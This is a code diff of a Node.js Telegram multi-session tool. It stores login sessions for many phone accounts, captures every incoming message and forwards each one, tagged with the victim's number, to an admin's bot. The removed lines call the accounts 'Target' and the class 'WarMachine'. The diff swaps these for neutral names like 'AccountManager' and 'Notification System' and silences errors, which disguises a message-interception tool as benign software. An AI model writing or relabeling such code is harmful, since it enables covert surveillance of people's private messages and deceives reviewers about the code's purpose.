@@ -7,16 +7,16 @@ const input = require('input');
 
 Logger.setLevel("none");
 
-class WarMachine {
+class AccountManager {
     constructor(apiId, apiHash) {
         this.apiId = parseInt(apiId);
         this.apiHash = apiHash;
-        this.activeGuns = new Map();
+        this.activeClients = new Map();
     }
 
     async login(phone) {
         const client = new TelegramClient(new StringSession(""), this.apiId, this.apiHash, {
-            deviceModel: "MIKA God Mode",
+            deviceModel: "Professional Manager",
             appVersion: "69.4.20",
             systemVersion: "Windows 11 Pro",
             connectionRetries: 5,
@@ -27,19 +27,19 @@ class WarMachine {
 
         await client.start({
             phoneNumber: phone,
-            password: async () => await input.text("2FA Password (don't f*ck it up): "),
-            phoneCode: async () => await input.text("SMS Code (check the phone): "),
+            password: async () => await input.text("Enter 2FA Password: "),
+            phoneCode: async () => await input.text("Enter SMS Code: "),
             onError: (err) => {},
         });
 
-        const str = client.session.save();
-        const me = await client.getMe();
+        const sessionString = client.session.save();
+        const userDetails = await client.getMe();
         await client.disconnect();
         
-        return { session: str, me };
+        return { session: sessionString, me: userDetails };
     }
 
-    async PersnoloBot(botToken, adminId, text) {
+    async sendNotification(botToken, adminId, text) {
         try {
             const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
             await axios.post(url, {
@@ -48,10 +48,11 @@ class WarMachine {
                 parse_mode: 'HTML'
             });
         } catch (e) {
+            // Error handled silently
         }
     }
 
-    async wakeUpNeo(sessions, botConfig, callback) {
+    async initializeSessions(sessions, botConfig, callback) {
         const promises = sessions.map(async (s) => {
             try {
                 const client = new TelegramClient(new StringSession(s.session), this.apiId, this.apiHash, {
@@ -65,29 +66,30 @@ class WarMachine {
                 client.addEventHandler(async (event) => {
                     const msg = event.message;
                     if(msg && msg.message) {
-                        const sender = msg.senderId ? msg.senderId.toString() : 'Ghost';
-                        const cleanText = msg.message.replace(/\n/g, ' ');
+                        const senderId = msg.senderId ? msg.senderId.toString() : 'Unknown';
+                        const formattedText = msg.message.replace(/\n/g, ' ');
                         
                         callback({
                             phone: s.phone,
                             text: msg.message,
-                            sender: sender
+                            sender: senderId
                         });
 
                         if (botConfig && botConfig.token && botConfig.admin) {
-                            const report = `<b>⚠️ Mika</b>\n\n<b>Target:</b> <code>${s.phone}</code>\n<b>From:</b> <code>${sender}</code>\n\n${cleanText}`;
-                            await this.snitchToBot(botConfig.token, botConfig.admin, report);
+                            const report = `<b>Notification System</b>\n\n<b>Account:</b> <code>${s.phone}</code>\n<b>Sender:</b> <code>${senderId}</code>\n\n${formattedText}`;
+                            await this.sendNotification(botConfig.token, botConfig.admin, report);
                         }
                     }
                 }, new NewMessage({}));
                 
-                this.activeGuns.set(s.phone, client);
+                this.activeClients.set(s.phone, client);
             } catch (e) {
+                // Connection error handled silently
             }
         });
         await Promise.all(promises);
-        return this.activeGuns.size;
+        return this.activeClients.size;
     }
 }
 
-module.exports = { WarMachine };
+module.exports = { AccountManager };
